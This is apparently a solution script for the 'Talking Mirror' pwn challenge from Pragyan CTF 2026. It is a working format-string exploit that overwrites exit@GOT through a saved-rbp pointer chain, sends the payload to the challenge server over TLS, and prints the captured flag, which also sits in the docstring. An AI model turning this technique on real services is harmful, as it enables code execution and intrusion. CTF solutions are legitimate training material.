#!/usr/bin/env python3
"""
Talking Mirror - Pragyan CTF 2026
Solved by: Smothy @ 0xN1umb

Format string vulnerability with indirect GOT overwrite via saved rbp chain.

The challenge: printf(user_input) with exit@GOT at 0x400a50 (contains \x0a byte
that breaks fgets). Solution: use non-positional format string to write exit@GOT
address into a stack slot via saved rbp pointer chain, then write win address
through the modified slot.

Flag: p_ctf{7hETAlk!n6M!RR0RSpOkeONE7OOmANyT!m3S}
"""
import ssl
import socket
import select
import time

def exploit():
    exit_got = 0x400a50   # exit@GOT - contains \x0a, can't put in buffer directly
    win_low  = 0x1216     # low 2 bytes of win() = 0x401216

    # Indirect write technique:
    # 1. Args 1-19 consumed with %c, padding total to 0x400a50 = 4196944 chars
    # 2. %n on arg 20 (saved rbp) writes 0x400a50 to [rbp_main] = arg 22 slot
    # 3. %hn on arg 22 (now = exit@GOT) writes 0x1216 to exit@GOT -> redirects to win()

    X = exit_got - 18     # 4196926 - first %c padding (+ 18 more %c = 4196944 total)
    Y = win_low - (exit_got % 0x10000)  # 1990 - second %c padding for 0x1216 mod 65536

    payload = f'%{X}c'.encode() + b'%c' * 18 + b'%n' + f'%{Y}c'.encode() + b'%hn'
    print(f"[*] Payload ({len(payload)} bytes): {payload}")

    ctx = ssl.create_default_context()
    sock = socket.create_connection(('talking-mirror.ctf.prgy.in', 1337), timeout=30)
    ssock = ctx.wrap_socket(sock, server_hostname='talking-mirror.ctf.prgy.in')
    ssock.setblocking(False)

    all_data = b''
    start = time.time()
    banner_received = False

    while time.time() - start < 90:
        readable, _, _ = select.select([ssock], [], [], 0.5)
        if readable:
            try:
                data = ssock.recv(65536)
                if data:
                    all_data += data
                    if b'\n' in all_data and not banner_received:
                        banner_received = True
                        print("[*] Banner received. Sending exploit...")
                        ssock.setblocking(True)
                        ssock.send(payload + b'\n')
                        ssock.setblocking(False)
                        all_data = b''
                        continue
                else:
                    break
            except ssl.SSLWantReadError:
                continue
            except Exception as e:
                print(f"[-] Error: {e}")
                break

        if banner_received and b'p_ctf' in all_data:
            break

    idx = all_data.find(b'p_ctf')
    if idx >= 0:
        flag = all_data[idx:].split(b'\n')[0].decode()
        print(f"[+] FLAG: {flag}")
    else:
        print(f"[-] Flag not found in {len(all_data)} bytes")

    ssock.close()

if __name__ == '__main__':
    exploit()
